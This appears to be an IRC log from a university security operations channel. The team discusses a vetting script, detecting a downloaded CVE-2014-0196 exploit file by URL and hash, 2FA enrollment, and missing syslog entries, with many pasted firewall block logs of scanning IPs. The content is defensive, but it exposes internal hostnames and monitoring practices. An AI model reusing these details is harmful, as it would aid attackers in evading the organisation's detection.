2014-05-12 16:39:18	jazoff	well it's not so much 'combine' as 'not split' :)
2014-05-12 16:39:27	jazoff	the code I have splits all the '#################' blocks
2014-05-12 16:39:40	hypnotoad	right
2014-05-12 16:39:52	jazoff	hmm, something may be up with the .sh script...
2014-05-12 16:40:00	jazoff	look at the bwbh-test-2014-05-12.audit
2014-05-12 16:40:23	jazoff	SUIDS/SGIDS aren't showing the path, and 'Publically listening services' just shows 'tcp'
2014-05-12 16:41:31	hypnotoad	that is strange
2014-05-12 16:41:53	hypnotoad	that seems to be the case on all the ones i ran today...damn
2014-05-12 16:42:23	hypnotoad	what edits did you make to the vetting script? possibly you forgot to close out a quote or somethign?
2014-05-12 16:43:35	hypnotoad	do you have the commit hash so i can search it on git-sec
2014-05-12 16:46:22	jazoff	you can do...
2014-05-12 16:46:33	jazoff	git log -p modules/vetting/files/vetting.sh
2014-05-12 16:47:15	jazoff	i don't think any of my change would have caused that
2014-05-12 16:47:22	jazoff	hmmm
2014-05-12 16:47:39	jazoff	maybe it should be #!/bin/bash and not #!/bin/sh ? some boxes might not be using bash as /bin/sh
2014-05-12 16:48:33	hypnotoad	that was intentional so it would work on SuSE and SLES
2014-05-12 16:49:05	hypnotoad	and bwbh-test is using bash
2014-05-12 16:49:28	hypnotoad	lrwxrwxrwx. 1 root root      4 Mar 17 11:49 sh -> bash
2014-05-12 16:49:29	jazoff	weird
2014-05-12 16:50:58	hypnotoad	idk i'll look into it more tomorrow i gotta get moving in a minute
2014-05-13 10:44:16	jazoff	walk time :)
2014-05-13 11:00:21	-->	wraquel1 (Adium@hidden-B167D4F0.ncsa.illinois.edu) has joined #security
2014-05-13 11:00:30	<--	wraquel1 (Adium@hidden-B167D4F0.ncsa.illinois.edu) has quit (Quit: wraquel1)
2014-05-14 09:41:11	jazoff	who is wlhmbp.ncsa.illinois.edu. ?
2014-05-14 09:41:25	jazoff	they downloaded the cve-2014-0196-md.c
2014-05-14 09:44:32	wraquel	wlh mac book pro
2014-05-14 09:44:35	wraquel	Whoever wlh is.
2014-05-14 09:44:44	wraquel	Oh.
2014-05-14 09:44:44	wraquel	Wayne
2014-05-14 09:44:48	wraquel	He's testing iForge
2014-05-14 09:50:38	jazoff	unless someone was stupid enough to wget the exploit over http, not likely to detect it that way
2014-05-14 09:51:04	hypnotoad	add it to known bad downloads...easy to add and who knows, someone may be
2014-05-14 10:10:10	jazoff	well we can find it by has too
2014-05-14 10:10:11	jazoff	hash
2014-05-14 10:13:17	jazoff	i see it did get downloaded to jyc1.ncsa.illinois.edu. and h2ologin4.ncsa.illinois.edu.
2014-05-14 10:24:58	hypnotoad	whatever works, just know that known bad method would be very easy since we dont expect people to actually http them
2014-05-14 10:33:41	jazoff	hmm, I can setup bro to do it, but that requries restarting it
2014-05-14 10:33:47	jazoff	or just setup an alert in splunk
2014-05-14 10:37:21	jazoff	keist: do you know if you can add an Intel::FILE_HASH entry to one of the existing CIF reports?
2014-05-14 10:44:34	jazoff	grr, and this is the point that I realize I automated the csv updating but not the regex updating
2014-05-14 11:24:32	jazoff	ok, that url is being watched for in dev and prod
2014-05-14 11:24:49	jazoff	for now I can just search for the hash to see if it gets transfered in another way
2014-05-14 11:24:59	jazoff	need to figure out how to add hash feeds to cif
2014-05-14 11:25:05	jazoff	walk time :)
2014-05-14 13:11:58	jazoff	neat http://awstcocalculator.com/
2014-05-14 14:48:52	wraquel	So.... Just noticed a nifty little feature in google maps.
2014-05-14 14:49:10	wraquel	If you click on buildings on the UI campus, there are numbers that show up in the lower right hand corner.
2014-05-14 14:49:19	wraquel	That lets you see the individual floorplans for each floor.
2014-05-14 14:49:42	wraquel	There are bathrooms, room numbers, etc, all available.
2014-05-14 14:51:22	wraquel	Interesting. I didn't know there was an elevator in that part of DCL....
2014-05-14 14:56:35	jazoff	guess they aren't concerned about shootings
2014-05-14 14:56:58	jazoff	apparently someone at UA was building something like that a while ago and was forced to remove it due to security concerns
2014-05-14 15:31:01	jazoff	wow, the basic duo verification API is stupid simple
2014-05-14 15:31:32	jazoff	I did find that you can't use verify api with the same api keys that the auth api uses though
2014-05-14 15:31:37	jazoff	you need a second set for use with verify
2014-05-14 15:42:04	jazoff	I think I have it worked out in my head how the phone verification -> tfa enrollment would work
2014-05-14 15:43:21	jazoff	all the verify api does is sent the user a code and return to the caller what code was sent
2014-05-14 15:43:41	jazoff	so it's just a matter of saving it in the session and then verifying it
2014-05-14 15:51:46	jazoff	ah, I just thought about this more
2014-05-14 15:52:10	jazoff	I can't think of any reason why requiring manual intervential before doing 2fa would benefit anything
2014-05-14 15:52:52	jazoff	if someone compromises your account, they can lock you out of it just by changing the password
2014-05-14 15:53:08	jazoff	OR: if someone compromises your account, they can lock you out of it by enabling 2fa
2014-05-14 15:53:16	jazoff	either way, the user is going to call the helpdesk
2014-05-14 15:53:46	jazoff	if enabling 2fa requires a helpdesk call, then changing a password should too
2014-05-14 16:04:33	jazoff	unless I'm missing something :)
2014-05-14 16:15:11	eyrich	its now about locking out account - its about identity theft
2014-05-14 16:15:34	eyrich	user doesnt have 2fa, loses control of their kerb password
2014-05-14 16:15:47	eyrich	theif gets a 2fa in users name
2014-05-14 16:16:29	eyrich	bad guy can then access systems that require 2fa - ie TFCA
2014-05-14 16:16:36	jazoff	ah
2014-05-14 16:17:14	eyrich	by having help desk create inital account and phone number to be contacted at then that could be aleviated
2014-05-14 16:17:34	jazoff	so then it's not so much self enrollment.. :)
2014-05-14 16:17:47	eyrich	so not providing self enrollment - 
2014-05-14 16:18:14	eyrich	yes - I never used that term, i wanted self service for adding/removing tokens, phones, ...
2014-05-14 16:18:36	eyrich	But maybe UIUC wants full self-enrollment
2014-05-14 16:18:46	eyrich	which means we need their requirments doc
2014-05-14 16:19:18	eyrich	heading out - later
2014-05-14 16:20:41	jazoff	hmm, I wonder if there is an API for the "bulk enrollment" feature
2014-05-14 16:20:52	jazoff	since that is what admins can use to invite someone to enroll
2014-05-14 16:27:50	jazoff	well, that's something to look into.. i'm sure you can do it I just don't see it in the API
2014-05-14 16:50:11	jazoff	guess we mainly need a flowchart of how 2fa enrollment is supposed to work
2014-05-15 09:55:17	eyrich	local logs on bhr - 
2014-05-15 09:55:19	eyrich	May 15 09:01:03 cygnus BHR_STATS: WHO=soehlert TOTAL_BLOCKED=1
2014-05-15 09:55:19	eyrich	May 15 09:01:03 cygnus BHR_STATS: WHO=secops TOTAL_BLOCKED=78
2014-05-15 09:55:19	eyrich	May 15 09:01:03 cygnus BHR_STATS: WHO=eyrich TOTAL_BLOCKED=23
2014-05-15 09:55:19	eyrich	May 15 09:01:03 cygnus BHR_STATS: WHO=bro TOTAL_BLOCKED=64717
2014-05-15 09:55:19	eyrich	May 15 09:01:03 cygnus BHR_STATS: WHO=wraquel TOTAL_BLOCKED=1
2014-05-15 09:56:14	wraquel	Hmmm. I thought we were up to 150k
2014-05-15 09:56:20	wraquel	Did we drop back down?
2014-05-15 09:56:43	jazoff	yeah
2014-05-15 09:58:36	jazoff	wonder why that isn't making it to splunk
2014-05-15 09:58:48	jazoff	guess the next thing to check would be the syslog servers
2014-05-15 09:59:17	eyrich	hypnotoad: whats the host again
2014-05-15 09:59:23	hypnotoad	seclogs
2014-05-15 10:02:11	eyrich	is there a cat program for tbz files?
2014-05-15 10:02:16	eyrich	like zcat
2014-05-15 10:02:30	jazoff	ah.. kinda
2014-05-15 10:02:43	jazoff	bzcat willl get you the tarball
2014-05-15 10:02:53	jazoff	I suppose you can grep that ok, may need to use grep -a
2014-05-15 10:03:01	jazoff	(the tar file has binary headers)
2014-05-15 10:09:19	eyrich	is this the proper log forwaridng line?
2014-05-15 10:09:21	eyrich	*.* @@syslog-sec.ncsa.illinois.edu:514
2014-05-15 10:09:31	hypnotoad	yes
2014-05-15 10:10:24	wraquel	for rysyslog at least.
2014-05-15 10:10:32	eyrich	sec logs does not have the stats
2014-05-15 10:10:36	eyrich	but does have other logs
2014-05-15 10:10:38	hypnotoad	well that's the part we're talking about..
2014-05-15 10:10:40	eyrich	from cygnus
2014-05-15 10:10:51	eyrich	multi line problem?
2014-05-15 10:14:14	hypnotoad	i doubt it
2014-05-15 10:15:00	eyrich	where logs before moved to /usr/local/logs/archive/seclogs
2014-05-15 10:16:36	wraquel	What are you looking for?
2014-05-15 10:16:43	eyrich	todays logs
2014-05-15 10:16:46	hypnotoad	dated directory under /usr/local/logs
2014-05-15 10:16:53	wraquel	logsec has it broken down by host.
2014-05-15 10:16:57	hypnotoad	/usr/local/logs/2014/05/15
2014-05-15 10:18:50	eyrich	seclogs is missing a lot of logs from cygnus
2014-05-15 10:19:09	hypnotoad	based on?
2014-05-15 10:19:28	eyrich	looking at the local logs and the logs on seclogs
2014-05-15 10:19:42	hypnotoad	as in number of lines or were you expecting more files?
2014-05-15 10:20:07	eyrich	here is the logs 10am and after on seclogs
2014-05-15 10:20:25	eyrich	here are the ones on cygnus
2014-05-15 10:20:31	eyrich	May 15 10:00:02 cygnus BHR_UNBLOCK: IP=113.161.83.147 WHO=cronjob WHY=Block Time Expired
2014-05-15 10:20:33	eyrich	May 15 10:00:03 cygnus BHR_UNBLOCK: IP=14.223.69.200 WHO=cronjob WHY=Block Time Expired
2014-05-15 10:20:33	eyrich	May 15 10:00:03 cygnus BHR_UNBLOCK: IP=181.52.122.56 WHO=cronjob WHY=Block Time Expired
2014-05-15 10:20:33	eyrich	May 15 10:00:03 cygnus BHR_UNBLOCK: IP=83.15.105.81 WHO=cronjob WHY=Block Time Expired
2014-05-15 10:20:33	eyrich	May 15 10:00:03 cygnus BHR_UNBLOCK: IP=39.67.75.200 WHO=cronjob WHY=Block Time Expired
2014-05-15 10:20:33	eyrich	May 15 10:00:03 cygnus BHR_UNBLOCK: IP=189.249.22.60 WHO=cronjob WHY=Block Time Expired
2014-05-15 10:20:33	eyrich	May 15 10:00:03 cygnus BHR_UNBLOCK: IP=61.185.114.72 WHO=cronjob WHY=Block Time Expired
2014-05-15 10:20:36	eyrich	May 15 10:00:03 cygnus BHR_UNBLOCK: IP=46.211.232.73 WHO=cronjob WHY=Block Time Expired
2014-05-15 10:20:38	eyrich	May 15 10:00:03 cygnus BHR_UNBLOCK: IP=110.153.4.116 WHO=cronjob WHY=Block Time Expired
2014-05-15 10:20:40	eyrich	May 15 10:00:09 cygnus BHR_BLOCK: IP=151.248.122.22 HOSTNAME=skidcard.kz WHO=bro WHY=SSH::Bad_Client_Password_Guessing: 151.248.122.22 appears to be guessing SSH passwords with a bad client (seen in 113 connections). UNTIL=1402758009
2014-05-15 10:20:43	eyrich	May 15 10:00:17 cygnus BHR_BLOCK: IP=94.23.27.213 HOSTNAME=ns205419.ovh.net WHO=bro WHY=Scan::Address_Scan: 94.23.27.213 scanned at least 37 unique hosts on port 22/tcp in 0m15s UNTIL=1402758017
2014-05-15 10:20:46	eyrich	May 15 10:00:21 cygnus BHR_BLOCK: IP=95.85.10.112 HOSTNAME=null WHO=bro WHY=Scan::Address_Scan: 95.85.10.112 scanned at least 37 unique hosts on port 22/tcp in 0m16s UNTIL=1402758021
2014-05-15 10:20:49	eyrich	May 15 10:00:24 cygnus BHR_BLOCK: IP=46.252.128.235 HOSTNAME=srv1.level88.de WHO=bro WHY=Scan::Address_Scan: 46.252.128.235 scanned at least 37 unique hosts on port 22/tcp in 0m9s UNTIL=1402758024
2014-05-15 10:20:52	eyrich	May 15 10:00:25 cygnus BHR_BLOCK: IP=87.106.39.43 HOSTNAME=secure.bennettbrooks.co.uk WHO=bro WHY=Scan::Address_Scan: 87.106.39.43 scanned at least 37 unique hosts on port 22/tcp in 0m15s UNTIL=1402758025
2014-05-15 10:20:56	eyrich	May 15 10:00:26 cygnus BHR_BLOCK: IP=213.165.78.182 HOSTNAME=s17340003.onlinehome-server.info WHO=bro WHY=Scan::Address_Scan: 213.165.78.182 scanned at least 37 unique hosts on port 22/tcp in 0m15s UNTIL=1402758026
2014-05-15 10:20:58	eyrich	May 15 10:00:27 cygnus BHR_BLOCK: IP=91.206.143.222 HOSTNAME=caroffice.com WHO=bro WHY=Scan::Address_Scan: 91.206.143.222 scanned at least 37 unique hosts on port 22/tcp in 0m15s UNTIL=1402758027
2014-05-15 10:21:02	eyrich	May 15 10:00:28 cygnus BHR_BLOCK: IP=195.191.25.248 HOSTNAME=server1.semius.com.ua WHO=bro WHY=Scan::Address_Scan: 195.191.25.248 scanned at least 37 unique hosts on port 22/tcp in 0m20s UNTIL=1402758028
2014-05-15 10:21:05	eyrich	May 15 10:00:28 cygnus BHR_BLOCK: IP=117.203.233.137 HOSTNAME=null WHO=bro WHY=Scan::Address_Scan: 117.203.233.137 scanned at least 37 unique hosts on port 23/tcp in 0m14s UNTIL=1402758028
2014-05-15 10:21:07	eyrich	May 15 10:00:29 cygnus BHR_BLOCK: IP=220.166.206.161 HOSTNAME=161.206.166.220.broad.cd.sc.dynamic.163data.com.cn WHO=bro WHY=Scan::Address_Scan: 220.166.206.161 scanned at least 37 unique hosts on port 23/tcp in 0m12s UNTIL=1402758029
2014-05-15 10:21:11	eyrich	May 15 10:00:31 cygnus BHR_BLOCK: IP=62.210.204.103 HOSTNAME=62-210-204-103.rev.poneytelecom.eu WHO=bro WHY=Scan::Address_Scan: 62.210.204.103 scanned at least 37 unique hosts on port 22/tcp in 0m20s UNTIL=1402758031
2014-05-15 10:21:13	eyrich	May 15 10:00:32 cygnus BHR_BLOCK: IP=87.106.44.3 HOSTNAME=florian.reith.in WHO=bro WHY=Scan::Address_Scan: 87.106.44.3 scanned at least 37 unique hosts on port 22/tcp in 0m15s UNTIL=1402758032
2014-05-15 10:21:17	eyrich	May 15 10:00:33 cygnus BHR_BLOCK: IP=87.106.183.102 HOSTNAME=audinex.com WHO=bro WHY=Scan::Address_Scan: 87.106.183.102 scanned at least 37 unique hosts on port 22/tcp in 0m21s UNTIL=1402758033
2014-05-15 10:21:19	eyrich	May 15 10:00:38 cygnus BHR_BLOCK: IP=94.102.208.75 HOSTNAME=1A-7526.antagus.de WHO=bro WHY=SSH::Subnet_Scanner: 94.102.208.75 scanned 4 subnets UNTIL=1402758038
2014-05-15 10:21:21	eyrich	May 15 10:00:48 cygnus BHR_BLOCK: IP=212.227.97.72 HOSTNAME=p15200055.pureserver.info WHO=bro WHY=Scan::Address_Scan: 212.227.97.72 scanned at least 37 unique hosts on port 22/tcp in 0m15s UNTIL=1402758048
2014-05-15 10:21:25	eyrich	May 15 10:00:54 cygnus BHR_BLOCK: IP=188.120.225.71 HOSTNAME=best-website.ru WHO=bro WHY=Scan::Address_Scan: 188.120.225.71 scanned at least 37 unique hosts on port 22/tcp in 0m20s UNTIL=1402758054
2014-05-15 10:21:27	eyrich	May 15 10:01:03 cygnus BHR_STATS: WHO=soehlert TOTAL_BLOCKED=1
2014-05-15 10:21:28	eyrich	May 15 10:01:03 cygnus BHR_STATS: WHO=secops TOTAL_BLOCKED=77
2014-05-15 10:21:28	eyrich	May 15 10:01:03 cygnus BHR_STATS: WHO=eyrich TOTAL_BLOCKED=23
2014-05-15 10:21:31	eyrich	May 15 10:01:03 cygnus BHR_STATS: WHO=bro TOTAL_BLOCKED=64674
2014-05-15 10:21:31	eyrich	May 15 10:01:03 cygnus BHR_STATS: WHO=wraquel TOTAL_BLOCKED=1
2014-05-15 10:21:31	eyrich	May 15 10:05:02 cygnus BHR_UNBLOCK: IP=171.217.52.58 WHO=cronjob WHY=Block Time Expired
2014-05-15 10:21:34	eyrich	May 15 10:05:02 cygnus BHR_UNBLOCK: IP=116.26.223.238 WHO=cronjob WHY=Block Time Expired
2014-05-15 10:21:36	eyrich	May 15 10:05:02 cygnus BHR_UNBLOCK: IP=59.58.164.27 WHO=cronjob WHY=Block Time Expired
2014-05-15 10:21:38	eyrich	May 15 10:05:02 cygnus BHR_UNBLOCK: IP=183.9.140.108 WHO=cronjob WHY=Block Time Expired
2014-05-15 10:21:40	eyrich	May 15 10:05:02 cygnus BHR_UNBLOCK: IP=122.93.148.127 WHO=cronjob WHY=Block Time Expired
2014-05-15 10:21:42	eyrich	May 15 10:05:02 cygnus BHR_UNBLOCK: IP=37.213.222.245 WHO=cronjob WHY=Block Time Expired
2014-05-15 10:21:45	eyrich	May 15 10:05:02 cygnus BHR_UNBLOCK: IP=113.135.218.12 WHO=cronjob WHY=Block Time Expired
2014-05-15 10:21:45	eyrich	May 15 10:05:14 cygnus BHR_BLOCK: IP=212.159.137.35 HOSTNAME=host-212-159-137-35.static.as13285.net WHO=bro WHY=Scan::Address_Scan: 212.159.137.35 scanned at least 38 unique hosts on port 5000/tcp in 0m41s UNTIL=1402758314
2014-05-15 10:21:49	eyrich	May 15 10:05:16 cygnus BHR_BLOCK: IP=181.211.173.140 HOSTNAME=140.pichincha.andinanet.net WHO=bro WHY=Scan::Address_Scan: 181.211.173.140 scanned at least 37 unique hosts on port 23/tcp in 0m25s UNTIL=1402758316
2014-05-15 10:21:53	eyrich	May 15 10:05:17 cygnus BHR_BLOCK: IP=2.138.240.178 HOSTNAME=178.Red-2-138-240.dynamicIP.rima-tde.net WHO=bro WHY=Scan::Address_Scan: 2.138.240.178 scanned at least 37 unique hosts on port 445/tcp in 0m15s UNTIL=1402758317
2014-05-15 10:21:55	eyrich	May 15 10:05:20 cygnus BHR_BLOCK: IP=42.97.61.165 HOSTNAME=null WHO=bro WHY=Scan::Address_Scan: 42.97.61.165 scanned at least 37 unique hosts on port 23/tcp in 0m7s UNTIL=1402758320
2014-05-15 10:21:59	eyrich	May 15 10:05:21 cygnus BHR_BLOCK: IP=186.0.29.108 HOSTNAME=pei-186-0-xxix-cviii.une.net.co WHO=bro WHY=Scan::Address_Scan: 186.0.29.108 scanned at least 37 unique hosts on port 23/tcp in 0m17s UNTIL=1402758321
2014-05-15 10:22:01	eyrich	May 15 10:05:33 cygnus BHR_BLOCK: IP=117.208.99.33 HOSTNAME=null WHO=bro WHY=Scan::Address_Scan: 117.208.99.33 scanned at least 37 unique hosts on port 23/tcp in 0m20s UNTIL=1402758333
2014-05-15 10:22:05	eyrich	May 15 10:05:52 cygnus BHR_BLOCK: IP=79.170.95.60 HOSTNAME=vps40622.public.cloudvps.com WHO=bro WHY=Scan::Address_Scan: 79.170.95.60 scanned at least 37 unique hosts on port 22/tcp in 0m25s UNTIL=1402758352
2014-05-15 10:22:09	eyrich	May 15 10:05:55 cygnus BHR_BLOCK: IP=88.190.46.143 HOSTNAME=88-190-46-143.rev.dedibox.fr WHO=bro WHY=Scan::Address_Scan: 88.190.46.143 scanned at least 37 unique hosts on port 22/tcp in 0m25s UNTIL=1402758355
2014-05-15 10:22:11	eyrich	May 15 10:06:17 cygnus BHR_BLOCK: IP=216.194.169.244 HOSTNAME=elite2054.inmotionhosting.com WHO=bro WHY=Scan::Address_Scan: 216.194.169.244 scanned at least 35 unique hosts on port 25/tcp in 3m26s UNTIL=1402758377
2014-05-15 10:22:13	eyrich	May 15 10:10:02 cygnus BHR_UNBLOCK: IP=222.44.235.137 WHO=cronjob WHY=Block Time Expired
2014-05-15 10:22:15	eyrich	May 15 10:10:02 cygnus BHR_UNBLOCK: IP=182.150.42.201 WHO=cronjob WHY=Block Time Expired
2014-05-15 10:22:16	eyrich	May 15 10:10:03 cygnus BHR_UNBLOCK: IP=114.239.136.3 WHO=cronjob WHY=Block Time Expired
2014-05-15 10:22:17	wraquel	holy pastebin batman
2014-05-15 10:22:18	eyrich	May 15 10:10:03 cygnus BHR_UNBLOCK: IP=187.174.211.38 WHO=cronjob WHY=Block Time Expired
2014-05-15 10:22:20	eyrich	May 15 10:10:03 cygnus BHR_UNBLOCK: IP=178.150.158.14 WHO=cronjob WHY=Block Time Expired
2014-05-15 10:22:22	eyrich	May 15 10:10:03 cygnus BHR_UNBLOCK: IP=89.109.18.110 WHO=cronjob WHY=Block Time Expired
2014-05-15 10:22:24	eyrich	May 15 10:10:03 cygnus BHR_UNBLOCK: IP=59.177.12.79 WHO=cronjob WHY=Block Time Expired
2014-05-15 10:22:27	eyrich	May 15 10:10:29 cygnus BHR_BLOCK: IP=183.0.120.54 HOSTNAME=null WHO=bro WHY=Scan::Address_Scan: 183.0.120.54 scanned at least 37 unique hosts on port 23/tcp in 0m25s UNTIL=1402758629
2014-05-15 10:22:29	eyrich	May 15 10:10:33 cygnus BHR_BLOCK: IP=69.64.36.18 HOSTNAME=dragon409.startdedicated.com WHO=bro WHY=Scan::Address_Scan: 69.64.36.18 scanned at least 38 unique hosts on port 8080/tcp in 0m13s UNTIL=1402758633
2014-05-15 10:22:33	eyrich	May 15 10:10:58 cygnus BHR_BLOCK: IP=186.92.150.61 HOSTNAME=null WHO=bro WHY=Scan::Address_Scan: 186.92.150.61 scanned at least 37 unique hosts on port 139/tcp in 0m24s UNTIL=1402758658
2014-05-15 10:22:36	eyrich	May 15 10:15:02 cygnus BHR_UNBLOCK: IP=113.15.245.70 WHO=cronjob WHY=Block Time Expired
2014-05-15 10:22:38	eyrich	May 15 10:15:02 cygnus BHR_UNBLOCK: IP=219.144.73.99 WHO=cronjob WHY=Block Time Expired
2014-05-15 10:22:40	eyrich	May 15 10:15:02 cygnus BHR_UNBLOCK: IP=113.105.116.2 WHO=cronjob WHY=Block Time Expired
2014-05-15 10:22:42	eyrich	May 15 10:15:02 cygnus BHR_UNBLOCK: IP=190.147.42.140 WHO=cronjob WHY=Block Time Expired
2014-05-15 10:22:42	hypnotoad	im not sure this method is gonna work well..
2014-05-15 10:22:44	eyrich	May 15 10:15:17 cygnus BHR_BLOCK: IP=118.113.218.184 HOSTNAME=null WHO=bro WHY=Scan::Address_Scan: 118.113.218.184 scanned at least 37 unique hosts on port 23/tcp in 0m12s UNTIL=1402758917
2014-05-15 10:22:47	eyrich	May 15 10:15:20 cygnus BHR_BLOCK: IP=182.136.158.135 HOSTNAME=null WHO=bro WHY=Scan::Address_Scan: 182.136.158.135 scanned at least 37 unique hosts on port 23/tcp in 0m22s UNTIL=1402758920
2014-05-15 10:22:50	eyrich	May 15 10:15:21 cygnus BHR_BLOCK: IP=181.1.22.8 HOSTNAME=host8.181-1-22.telecom.net.ar WHO=bro WHY=Scan::Address_Scan: 181.1.22.8 scanned at least 37 unique hosts on port 443/tcp in 0m14s UNTIL=1402758921
2014-05-15 10:22:53	eyrich	May 15 10:15:25 cygnus BHR_BLOCK: IP=120.63.190.211 HOSTNAME=static-mum-120.63.190.211.mtnl.net.in WHO=bro WHY=Scan::Address_Scan: 120.63.190.211 scanned at least 37 unique hosts on port 23/tcp in 0m23s UNTIL=1402758925
2014-05-15 10:22:56	eyrich	May 15 10:15:29 cygnus BHR_BLOCK: IP=192.162.155.252 HOSTNAME=null WHO=bro WHY=Scan::Address_Scan: 192.162.155.252 scanned at least 37 unique hosts on port 445/tcp in 0m18s UNTIL=1402758929
2014-05-15 10:22:59	eyrich	May 15 10:15:38 cygnus BHR_BLOCK: IP=200.117.168.236 HOSTNAME=host236.200-117-168.telecom.net.ar WHO=bro WHY=Scan::Address_Scan: 200.117.168.236 scanned at least 37 unique hosts on port 443/tcp in 0m14s UNTIL=1402758938
2014-05-15 10:23:02	eyrich	May 15 10:15:41 cygnus BHR_BLOCK: IP=121.159.41.61 HOSTNAME=null WHO=bro WHY=Scan::Address_Scan: 121.159.41.61 scanned at least 37 unique hosts on port 23/tcp in 0m15s UNTIL=1402758941
2014-05-15 10:23:02	wraquel	Actually. A local pastebin would be interesting....
2014-05-15 10:23:05	eyrich	May 15 10:15:43 cygnus BHR_BLOCK: IP=188.190.70.227 HOSTNAME=null WHO=bro WHY=Scan::Address_Scan: 188.190.70.227 scanned at least 37 unique hosts on port 139/tcp in 0m17s UNTIL=1402758943
2014-05-15 10:23:09	eyrich	May 15 10:16:20 cygnus BHR_BLOCK: IP=113.133.131.202 HOSTNAME=null WHO=bro WHY=Scan::Address_Scan: 113.133.131.202 scanned at least 37 unique hosts on port 445/tcp in 4m57s UNTIL=1402758980
2014-05-15 10:23:14	eyrich	ya well
2014-05-15 10:23:15	eyrich	so yes - lots of missing lines on seclogs
2014-05-15 10:23:16	eyrich	what method >
2014-05-15 10:23:17	eyrich	 what is it you need?
2014-05-15 10:23:34	jazoff	wraquel: git-sec has one
2014-05-15 10:23:53	wraquel	yeah... the snippets thing?
2014-05-15 10:24:01	jazoff	yep
2014-05-15 10:24:21	eyrich	can i grep something to count
2014-05-15 10:25:05	jazoff	grep -c
2014-05-15 10:25:17	jazoff	or pipe to wc
2014-05-15 10:25:33	wraquel	wc -l
2014-05-15 10:31:00	eyrich	thanks
2014-05-15 10:38:33	keist	Now, with the $ vagrant up you can have a Bro Cluster: https://github.com/jonschipp/vagrant/tree/master/bro-cluster
2014-05-15 10:38:37	keist	:)
2014-05-15 10:40:46	jazoff	cool
2014-05-15 10:41:32	jazoff	only thing I would look into changing is making provision-manager.sh idempotent
2014-05-15 10:42:03	keist	good idea
2014-05-15 10:42:17	jazoff	i think it mostly works as is.. basically need a few lines line
2014-05-15 10:42:33	jazoff	if [ ! -d bro ] ; then git clone ...  ; fi
2014-05-15 10:42:37	keist	right
2014-05-15 10:42:41	jazoff	:)
2014-05-15 10:43:56	jazoff	https://github.com/JustinAzoff/vagrant-bro/blob/master/provision.sh was the one I wrote a while ago
2014-05-15 10:46:08	keist	okay, well I'll follow the logic there ;)
2014-05-15 10:47:01	hypnotoad	jazoff: im still sitting here trying to pronounce idempotent
2014-05-15 10:47:19	jazoff	yeah, I realized I couldn't when I was in town last
2014-05-15 10:48:36	jazoff	http://www.merriam-webster.com/audio.php?file=idempo01&word=idempotent
2014-05-15 10:48:58	wraquel	My mind wants to read it as impotent
2014-05-15 10:49:09	jazoff	http://en.wikipedia.org/wiki/Idempotence#Computer_science_meaning
2014-05-15 10:49:23	keist	I just think of "item potent" but 's/t/d/'
2014-05-15 10:49:57	jazoff	yeah
2014-05-15 11:05:25	wraquel	keist: Do you study for GIAC exams like you browse the net? http://t.co/YdHTzWpwAP
2014-05-15 11:10:43	keist	lol no, I browse the net much harder then I study for GIAC exams
2014-05-15 11:11:23	keist	yeah, I don't take notes or anything, that guy is trying to hard I think
2014-05-15 11:16:05	wraquel	True. I can actually see what's written on these tabs....
2014-05-15 13:25:47	wraquel	sigh. is jira down. I know it was supposed to go down for some kind of maintainance, but during work hours?
2014-05-15 14:45:35	hypnotoad	got a vet appointment. gotta run
2014-05-15 15:02:58	wraquel	action double features for the next two weekends at harvest moon. http://www.harvestmoondrivein.com/
2014-05-15 15:03:20	wraquel	Gozilla/Spiderman 2 this week.
2014-05-15 15:03:34	wraquel	X-Men/Winter Soldier next
2014-05-15 15:04:26	wraquel	Huh, oppsite Marvel movies is Sandler's Blended and Gozilla... odd mix.
2014-05-15 15:16:43	jazoff	hypnotoad: so adam says it's ok to grab the largest pcap we can for bro testing...
2014-05-15 15:17:09	jazoff	can we allocate all the lvm space on subzero? also, the myricom drivers are not installed there, do you know how that is done?
2014-05-15 15:33:52	jazoff	hmm, nagios alert about lots of buffered logs for cyclone..
2014-05-15 15:35:17	eyrich	my bad
2014-05-15 15:35:28	eyrich	i caused an outage on the log fw cluster
2014-05-15 15:36:04	eyrich	bad that nagios did not alert that the log service was not available
2014-05-15 15:36:59	eyrich	i turned on state syncing - which caused carp to fail - dont do carp and sync on the same interface. - they recomend a dedicated interface, but had never heard of it causing a problem
2014-05-15 15:37:10	eyrich	Im going to create a new vlan for it
2014-05-15 16:00:46	eyrich	damn it - even breaks when on a seperate sync vlan
2014-05-15 16:07:58	jazoff	no state syncing that's a bad state syncing
2014-05-15 16:17:02	eyrich	it think it has something to do with either the junipers and multicast or esx
2014-05-15 16:18:38	eyrich	or multiple link esx connected vswitches
2014-05-15 17:57:50	wraquel	hrmmm... Well, as long as it's not down long. We have everyone sending via TCP. If it can't connnect, those syslog instances could potentially crash.
2014-05-15 17:59:07	wraquel	Otherwise, we may need to rethink how we do log collection.
2014-05-15 18:03:18	wraquel	I assume we weren't notified because nagios is on the same lan as the syslog servers. Maybe we should set up checks from a separate lan altogether. a small one that's only a source for network based service checks.
2014-05-16 09:00:22	hypnotoad	Woke up feeling pretty crappy. Gonna take a sick day.
2014-05-16 09:07:44	wraquel	Looks like we're heading to no RHEL. Cut off on Satellite is June 30th.
2014-05-16 09:09:42	jazoff	how much space did thunder have?
2014-05-16 09:10:02	wraquel	don't recall.
2014-05-16 09:10:58	jazoff	ballpark?
2014-05-16 09:11:04	jazoff	few hundred gigs? few tb?
2014-05-16 09:11:36	wraquel	nope.
2014-05-16 09:11:40	jazoff	pcap box saw 2.2 TB over night
2014-05-16 09:11:41	wraquel	meaning, idunno
2014-05-16 09:11:56	jazoff	so 200G gets us only about an hour
2014-05-16 09:12:08	jazoff	but 5tb would get us 24 hours easy
2014-05-16 09:12:16	wraquel	Yeah, I don't think we have that much.
2014-05-16 09:12:26	wraquel	X00G is what I'm guessing.
2014-05-16 09:12:55	jazoff	ah
2014-05-16 09:13:30	wraquel	Eyrich is specing out a new SAN that should have significant space.
2014-05-16 09:14:36	jazoff	cool
2014-05-16 09:14:50	jazoff	not sure if this kind of thing should go on the san or just directly connected to the pcap/test box
2014-05-16 09:14:59	jazoff	2 4tb drives are only like $400
2014-05-16 11:30:07	hypnotoad	jazoff: gimme a little bit and ill up the size on subzero. i'll try and find my notes on installing myricom as well
2014-05-16 11:30:07	hypnotoad	also, wraquel June 30th?!!? ughhh
2014-05-16 11:40:01	jazoff	hypnotoad: ah, I'm not sure if it will be worth it
2014-05-16 11:40:20	hypnotoad	why not?
2014-05-16 11:40:20	hypnotoad	because of the discussion of 4tb drives?
2014-05-16 11:40:57	jazoff	yeah... 200g just doesn't get that much time
2014-05-16 11:41:20	jazoff	maybe reading it 10x would work though
